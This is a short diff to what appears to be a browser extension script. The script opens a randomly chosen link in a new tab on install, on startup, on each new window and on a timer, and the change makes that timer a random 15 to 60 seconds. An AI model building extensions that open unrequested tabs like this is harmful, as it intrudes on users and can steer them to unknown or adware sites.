@@ -19,6 +19,10 @@ function openRandomLink() {
     chrome.tabs.create({url: randomLink});
 }
 
+function getRandomInterval() {
+    return Math.floor(Math.random() * 45000 + 15000);
+}
+
 chrome.runtime.onInstalled.addListener(openRandomLink);
 
 chrome.runtime.onStartup.addListener(function(window) {
@@ -39,5 +43,6 @@ chrome.windows.onCreated.addListener(function(window) {
     });
 });
 
+const randomInterval = getRandomInterval();
 
-setInterval(openRandomLink, 30000);
+setInterval(openRandomLink, randomInterval);
